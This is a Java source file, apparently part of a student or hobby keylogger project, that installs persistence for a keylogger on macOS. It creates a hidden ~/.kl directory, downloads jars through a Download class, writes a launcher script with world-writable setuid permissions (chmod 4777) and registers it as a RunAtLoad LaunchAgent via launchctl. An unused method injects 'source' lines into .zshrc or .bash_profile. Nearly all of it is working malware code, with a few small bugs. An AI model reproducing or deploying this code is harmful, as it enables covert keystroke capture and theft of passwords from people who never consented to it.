/*
 *  OSX.java
 *  
 *  @Authors: Niklas Adolfsson and Alexander Persson
 *  @Date: 2016-05-12
 *  
 *  A class that 
 *    - creates a bash script in that is executable by all users by chmod 4777
 *      and writes the following contents:
 *       #!/bin/sh
 *       export CLASSPATH=".:$HOME/.kl/KeyLogger.jar:$HOME/.kl/jnativehook-2.0.3.jar:$HOME/.kl/javax.mail.jar:/$HOME/.kl/mail-1.4.7.jar"
 *       java KeyLogger &
 *    - creates a plist file in ~/Library/LaunchAgents that executes the bash script
 *    - Download dependencies
 *    - the bashRC() can be used to load the when the shell is loaded 
 *  
 */


import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class OSX 
{
  private String homedir;
  private String bashFile;
  private String keyloggerDir;
  private String command;
  private String plistFile;

  List<String> bashlines = Arrays.asList
      (
          "#!/bin/sh", 
          "export CLASSPATH=\".:$HOME/.kl/KeyLogger.jar:$HOME/.kl/jnativehook-2.0.3.jar:$HOME/.kl/javax.mail.jar:/$HOME/.kl/mail-1.4.7.jar\"",
          "java KeyLogger &"
          );

  public OSX()
  {
    homedir = System.getProperty("user.home").toLowerCase();
    keyloggerDir = homedir + File.separator + ".kl";
    bashFile = keyloggerDir + File.separator +  "java.sh";
    command = "source " + bashFile;
    plistFile = homedir + File.separator + "Library" + File.separator + 
        "LaunchAgents" + File.separator + "com.keylogger.start.plist";
    File f = null;
    try 
    {
      f = new File(keyloggerDir);
      f.mkdir();
    }
    catch (Exception e)
    {
      e.printStackTrace();
    }
    Download obj = new Download(keyloggerDir);
    this.createBootScript();
  }

  public void createBootScript()
  {

    this.createBashScript(); 
    this.createLaunchDaemon();
    //this.bashRC()
  }


  public void createBashScript()
  {
    Charset utf8 = StandardCharsets.UTF_8;

    try
    {
      Files.write(Paths.get(bashFile), bashlines, utf8, StandardOpenOption.CREATE);;
      List<String> command = new ArrayList<String>();
      command.add("chmod");
      command.add("4777");
      command.add(bashFile);
      ProcessBuilder pb = new ProcessBuilder(command);
      Process process = pb.start();
      process.waitFor();

    }
    catch (Exception e)
    {
      e.printStackTrace();
    }
  }

  /* creates a launchd and it assigned to the username i.e. not to the system */
  public void createLaunchDaemon()
  {
    String dummy = "<string>" + bashFile + "</string>";
    List<String> plistlines = Arrays.asList
        (
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
            "<!DOCTYPE plist PUBLIC \"\"-//Apple//DTD PLIST 1.0//EN\"",
            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">",
            "<plist version=\"1.0\">",
            "<dict>",
            "<key>Label</key>",
            "<string>com.keylogger.start.plist</string>",
            "<key>ProgramArguments</key>",
            "<array>",
            dummy,
            "</array>",
            "<key>Nice</key>",
            "<integer>1</integer>",
            "<key>RunAtLoad</key>",
            "<true/>",
            "<key>KeepAlive</key>",
            "<false/>",
            "<key>AbandonProcessGroup</key>",
            "<true/>",
            "<key>StandardErrorPath</key>",
            "<string>/tmp/AlTest1.err</string>",
            "<key>StandardOutPath</key>",
            "<string>/tmp/AlTest1.out</string>",
            "</dict>",
            "</plist>"
            );

    Charset utf8 = StandardCharsets.UTF_8;
    /* launchctl load plistFile */
    List<String> command = new ArrayList<String>();
    command.add("launchctl");
    command.add("load");
    command.add(plistFile);

    try
    {
      Files.write(Paths.get(plistFile), plistlines, utf8, StandardOpenOption.CREATE);
      ProcessBuilder pb = new ProcessBuilder(command);
      Process process = pb.start();
      process.waitFor();
    }
    catch (Exception e)
    {
      e.printStackTrace();
    }
  }



  /* Inject code in the config of bash so each time bash is restarted/started to KeyLogger is loaded */
  public void bashRC()
  {
    File file=new File(".");
    System.setProperty("user.dir", homedir);
    File hdir = new File(homedir);
    File [] flist = hdir.listFiles();
    boolean zshrc = false;
    boolean bash_profile = false;
    Charset utf8 = StandardCharsets.UTF_8;
    for ( File f : flist)
    {
      if ( f.getName().equals(".zshrc") )
      {
        zshrc = true;
      }
      if ( f.getName().equals(".bash_profile") )
      {
        zshrc = true;
      }
    }

    /* create .bash_profile */
    if ( !zshrc && !bash_profile )
    {
      List<String> lines = Arrays.asList("export PATH=\"$HOME/.rbenv/bin:$PATH", 
          "source " + bashFile);
      try
      {
        Files.write(Paths.get(homedir + File.separator + ".bash_profile"), lines, utf8, StandardOpenOption.CREATE);
      }
      catch (Exception e)
      {
        e.printStackTrace();
      }
    }
    /* zsh is installed */
    else if ( zshrc )
    {
      String line = null;
      boolean commandFound = false;
      try 
      {
        Path f = Paths.get(homedir + File.separator + ".zshrc");
        BufferedReader reader = Files.newBufferedReader(f, Charset.defaultCharset());
        while ((line = reader.readLine()) != null) 
        {
          if ( line.toLowerCase().contains(command))
          {
            commandFound = true;
          }
        }
        reader.close();         
      }
      catch(Exception e) 
      {
        e.printStackTrace();            
      }
      if (!commandFound)
      {
        List<String> lines = Arrays.asList("\n", "source " + bashFile);
        try 
        {
          Files.write(Paths.get(homedir + File.separator + ".zshrc"), lines, utf8, StandardOpenOption.APPEND);
        } 
        catch (IOException e) 
        {
          e.printStackTrace();
        }
      }
    }

    /* assume default settings in OS X */
    else
    {
      String line = null;
      boolean commandFound = false;
      try 
      {
        Path f = Paths.get(homedir + File.separator + ".bash_profile");
        BufferedReader reader = Files.newBufferedReader(f, Charset.defaultCharset());
        while ((line = reader.readLine()) != null) 
        {
          if ( line.toLowerCase().contains(command))
          {
            commandFound = true;
          }
        }
        reader.close();         
      }
      catch(Exception e) 
      {
        e.printStackTrace();            
      }
      if (!commandFound)
      {
        List<String> lines = Arrays.asList("\n", "source " + bashFile);
        try 
        {
          Files.write(Paths.get(homedir + File.separator + ".bash_profile"), lines, utf8, StandardOpenOption.APPEND);
        } 
        catch (IOException e) 
        {
          e.printStackTrace();
        }
      }
    }
  }





}
